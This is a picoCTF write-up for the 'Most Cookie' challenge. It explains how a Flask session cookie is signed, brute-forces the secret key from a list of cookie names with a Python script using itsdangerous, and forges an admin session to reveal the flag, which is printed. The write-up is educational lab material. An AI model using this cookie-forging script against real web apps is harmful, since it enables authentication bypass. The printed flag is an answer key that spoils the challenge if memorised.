
# PICOCTF - Most Cookie


### Description:
> Alright, enough of using my own encryption. Flask session cookies should be plenty secure! `server.py` http://mercury.picoctf.net:18835/
### Solution:
1. Firstly, let's do some reconnaissance.

From the description, we know that this site use the Flask session to "encode" their cookies, let's first take a look at the cookie before entering any value:

```
eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Y5s-Bw.kfx9C1txle5Kuc0lujp_-C_fiAY
```

The code provided in `server.py` also worthnoticing:

```python 
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)
```

In the block of code above, we can see that the server will randomly choose a value in `cookie_names` as our secret_key.

```python
@app.route("/")
def main():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "blank":
			return render_template("index.html", title=title)
		else:
			return make_response(redirect("/display"))
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp
```

In the `main` function, if we enter any cookie provided in `cookie_names` the page will be directed to `/display`, otherwise, if we search without enter anything it will remain in the homepage or `/index.html`.

```python
@app.route("/search", methods=["GET", "POST"])
def search():
	if "name" in request.form and request.form["name"] in cookie_names:
		resp = make_response(redirect("/display"))
		session["very_auth"] = request.form["name"]
		return resp
	else:
		message = "That doesn't appear to be a valid cookie."
		category = "danger"
		flash(message, category)
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp
```
In the `search` function, if we enter any cookie that is present in `cookie_names` we will be redirected to `/display`, ortherwise, we will be redirected to the homepage.

```python
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp
```

In the `flag` function, if our `check` variable is `admin` we will be able to see our flag, otherwise, we will be redirected to the homepaage. So our objective is to change `check` to `admin`.

2. After some researching on `Github` and `Google`, I came accross a really [cool article](https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce). We can ,therefore, break the encrypted cookie into 3 parts:

```
The Session Data: eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9
```

```
The Time stamp: Y5s-Bw
```

```
The Cryptographic Hash: kfx9C1txle5Kuc0lujp_-C_fiAY
```

The session data is a Base64 encoded string, so we can decode it as follows:

```
{"very_auth":"blank"}
```
Therefore, we need to change our `session data` to `admin` and the `time stamp` can be ignored. However, the `Cryptographic Hash` needs to be dealt with.
 
 In order to understand how our `Cryptographic Hash` is created, pay a visit to [this article](https://stackoverflow.com/questions/22463939/demystify-flask-app-secret-key). In a nutshell, our `cookie` will be added with our `secret_key` and encrypted with `sha1`. So we need to find a way to figure out the `secret_key`.

 The following code will generate our `secret_key` in accordance to the provided `wordlist` and `cookie string`:

```python
import hashlib
from itsdangerous import URLSafeTimedSerializer, TimestampSigner
from flask.sessions import TaggedJSONSerializer

#the provided cookies
wordlist = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

#encoded cookie of snickerdoodle
cookie_str = "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Y5tJ4A.wdS0ZlamUFnCNQCC69Z7T1OVCfE" 

#decode function
def decode_flask_cookie(secret_key, cookie_str):
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, serializer=serializer, salt=salt, signer_kwargs = signer_kwargs)
    return s.loads(cookie_str)

#decode every provided cookie to find the secret_key
session = {'very_auth': 'admin'}
for secret_key in wordlist:
    try:
        cookie = decode_flask_cookie(secret_key, cookie_str)
    except:
        continue
#Using the secret_key we can forge our new cookie
    print(URLSafeTimedSerializer(
    secret_key = secret_key,
    salt = 'cookie-session',
    serializer = TaggedJSONSerializer(),
    signer = TimestampSigner,
    signer_kwargs={
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
).dumps(session))
```

After successfully generated our `secret_key`, we can finally forge our own `cookie` using the `secret_key` and `{"very_auth":"admin"}`, the new cookie might look like this:

```
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Y5tSeQ.sntBroyYLInfPWRsGmeV661_yQk
```
3. We can then insert our cookie onto http://mercury.picoctf.net:18835/display to get our flag:

```
Flag: picoCTF{pwn_4ll_th3_cook1E5_743c20eb}
```




## Flag
```
picoCTF{pwn_4ll_th3_cook1E5_743c20eb}
```
